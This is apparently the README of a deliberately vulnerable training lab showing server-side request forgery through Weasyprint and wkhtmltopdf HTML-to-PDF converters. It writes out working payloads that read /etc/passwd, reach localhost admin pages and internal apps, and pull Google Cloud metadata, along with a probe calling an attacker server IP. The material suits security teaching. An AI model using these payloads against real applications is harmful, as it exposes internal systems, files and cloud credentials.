# 1.0 SSRF in HTML to PDF converter functionality

<b>Exploitation Difficulty: Easy</b><br>

These are the SSRF scenario based on the fact that when web application accepting the user user input, placing them in HTML and pass the HTML code to "HTML to PDF generator".
<br><br>When HTML code will be processed by the "HTML to PDF generator", HTML code will be evaluated to corresponding representation of that HTML code in web browser.
<br>In this case, if attacker supplied data is not getting senitized or filtered before placing it to HTML code, attacker can trick "HTML to PDF generator" software to access the internal Hosts/domains. 

We have scenarios of 2 "HTML to PDF generator" which allow an attacker to exploit SSRF vulnerability if web application is passing the untrusted user supplied data to HTML code.
<br>These "HTML to PDF generator" are:

    1. Weasyprint 
    2. wkhtmltopdf

<br><b>pdf_ssrf_weasyprint.php</b> is vulnerable script which is using <b>weasyprint</b>.
<br><b>pdf_ssrf_wkhtmltopdf.php</b> is vulnerable script which is using <b>wkhtmltopdf</b>.

<b>1.1 System Requirements:</b>
  
    1. Weasyprint and wkhtmltopdf converter must be installed on the machine.
    2. Web server with PHP support 

<b>1.2.1 Linux based setup: wkhtmltopdf</b>
<br>No change is required. This script is developed to work on Linux OS. 

<b>1.2.2 Windows based setup:</b>
<br>Below mentioned changes will be required:


Remove comment syntax from the line no "271" and "272" and make them like this

    $path_pdf_converter='C:\Program Files\wkhtmltopdf\bin\wkhtmltopdf.exe'; /*remove the comment if you want to use it on Windows machine*/
    passthru('"'.$path_pdf_converter.'" -T 0 -R 0 -B 0 -L 0 --orientation Portrait --page-size A4 sample.html output4.pdf'); /*remove the comment if you want to use it on Windows machine*/

Comment out the the line number 273 like this 

    //passthru('xvfb-run wkhtmltopdf -T 0 -R 0 -B 0 -L 0 --orientation Portrait --page-size A4 --quiet sample.html output4.pdf 2>&1');

<b>1.3 Installation</b>

wkthmltopdf
    
    sudo apt-get update
    sudo apt-get install xvfb libfontconfig wkhtmltopdf

weasyprint

As per the OS, follow steps from below mentioned URL to install the weasyprint:

https://weasyprint.readthedocs.io/en/stable/install.html
    

# 2.0 Exploitation


Let's start with exploitation and possible attack vectors to perform SSRF.

<b>2.1 SSRF in Weasyprint HTML to PDF generator</b>

Web application accepting user input via GUI.<br>  
![](https://github.com/incredibleindishell/SSRF_Vulnerable_lab/blob/master/www/pdf_generator/images/w1.png?raw=true)

Accepted the user input, placed it inside the HTML code and generated PDF by rendering the HTML code 

![](https://github.com/incredibleindishell/SSRF_Vulnerable_lab/blob/master/www/pdf_generator/images/w2.png?raw=true)

After observing such behavior, try with following payloads to confirm whether web application code is vulnerable:

    <h1>test</h1>
    <img src=http://attacker_server_IP/>

If web application is processing the above mentioned payloads, go for below mentioned payloads to exploit SSRF.

<b>Payloads</b>

To grab the data from HTTP based URL, use below mentioned style payload

    <link rel=attachment href="http://web_URL">
    <link rel=attachment href="http://localhost/admin.php">
To grab the data from internal file system, use below mentioned style payload

    <link rel=attachment href="file://internal_file_path">
    <link rel=attachment href="file:///etc/passwd">
<b>2.1.1 Exploiting the SSRF - Google Cloud Metadata endpoint access</b>

Let's assume, web application is hosted inside the Google Cloud Platform. Now, try to grab the data from Google Cloud internal Metadata endpoint.
I saved sample username and password during the creation of the Virtual machine which are accessible on below mentioned URL:
http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes

Below mentioned payload will grab and attach the HTTP response from the above metnioned Metadata URL to PDF:

    <link rel=attachment href="http://metadata.google.internal/computeMetadata/v1beta1/instance/?recursive=true">

![](https://github.com/incredibleindishell/SSRF_Vulnerable_lab/blob/master/pdf_generator/images/w3.png?raw=true)

Open the generated PDF and observe, nothing is there in customer name column. Download the generated PDF file to extract the data from it.

![](https://github.com/incredibleindishell/SSRF_Vulnerable_lab/blob/master/www/pdf_generator/images/w4.png?raw=true)

Extract the attached content from the downloaded PDF file using this Python <a href="https://github.com/incredibleindishell/SSRF_Vulnerable_Lab/blob/master/www/pdf_generator/weasy.py">Script</a> developed by Ben AKA Nahamsec. 

    python script.py  downloaded_file.pdf
  
![](https://github.com/incredibleindishell/SSRF_Vulnerable_lab/blob/master/www/pdf_generator/images/w5.png?raw=true)

And Python script extracted the attached HTTP response from the Internal Metadata URL.

This is how an attacker can extract the HTTP response from other internal IPs/Hosts.

<b>2.2 SSRF in wkhtmltopdf, HTML to PDF generator</b>

An attacker can exploit SSRF in web application using wkhtmltopdf to generate the PDF from HTML having untrusted user supplied data placed in it. 

Web application is accepting user supplied data 
![](https://github.com/incredibleindishell/SSRF_Vulnerable_lab/blob/master/www/pdf_generator/images/wk1.png?raw=true)

Generated PDF has user supplied data.
![](https://github.com/incredibleindishell/SSRF_Vulnerable_lab/blob/master/www/pdf_generator/images/wk2.png?raw=true)

Payload to load internal app rendered HTTP response inside the PDF using <iframe> HTML tag is:
    
    <iframe src="http://internal_app" height=800px width=800px></iframe>

<b>Payload to access the web page which has "X-Frame-Options" header</b> in HTTP response and can not be loaded inside the <iframe> HTML tag.
    
    <body onload="document.createElement('form').submit.call(document.getElementById('myForm'))"><form id="myForm" name="myForm" action="http://internal_app" method=GET></form></body> 

Specify the above mentioned payload and submit the form
![](https://github.com/incredibleindishell/SSRF_Vulnerable_lab/blob/master/www/pdf_generator/images/wk3.png?raw=true)

Open the generated the PDF and there we go....
![](https://github.com/incredibleindishell/SSRF_Vulnerable_lab/blob/master/www/pdf_generator/images/wk4.png?raw=true)


./Thanks

